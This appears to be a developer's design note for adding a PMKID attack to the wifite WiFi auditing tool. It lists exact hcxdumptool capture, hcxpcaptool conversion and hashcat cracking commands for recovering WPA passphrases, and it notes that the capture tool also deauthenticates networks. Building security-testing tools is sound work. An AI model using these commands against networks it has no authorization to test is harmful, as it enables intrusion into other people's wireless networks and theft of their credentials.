### PMKID Attack

See https://hashcat.net/forum/thread-7717.html

### Steps

1. Start `hcxdumptool` (daemon)
   * `sudo hcxdumptool -i wlan1mon -o pmkid.pcapng -t 10 --enable_status=1`
   * Should also use `-c <channel>`, `--filterlist` and `--filtermode` to target a specific client
   * Could be a new attack type: `wifite.attack.pmkid`
2. Detect when PMKID is found.
   * `hcxpcaptool -z pmkid.16800 pmkid.pcapng`
   * Single-line in pmkid.16800 will have PMKID, MACAP, MACStation, ESSID (in hex).
3. Save `.16800` file (to `./hs/`? or `./pmkids/`?)
   * New result type: `pmkid_result`
   * Add entry to `cracked.txt`
4. Run crack attack using hashcat:
   * `./hashcat64.bin --force -m 16800 -a0 -w2 path/to/pmkid.16800 path/to/wordlist.txt`

### Problems

* Requires latest hashcat to be installed. This might be in a different directory.
   * Use can specify path to hashcat? Yeck...
   * % hashcat -h | grep 16800
   * 16800 | WPA-PMKID-PBKDF2
* If target can't be attacked... we need to detect this failure mode.
   * Might need to scrape `hcxdumptool`'s output
   * Look at `pmkids()` func in .bashrc
   * hcxpcaptool -z OUTPUT.16800 INPUT.pcapng > /dev/null
   * Check OUTPUT.16800 for the ESSID.
* Wireless adapter support is minimal, apparently.
* hcxdumptool also deauths networks and captures handshakes... maybe unnecessarily

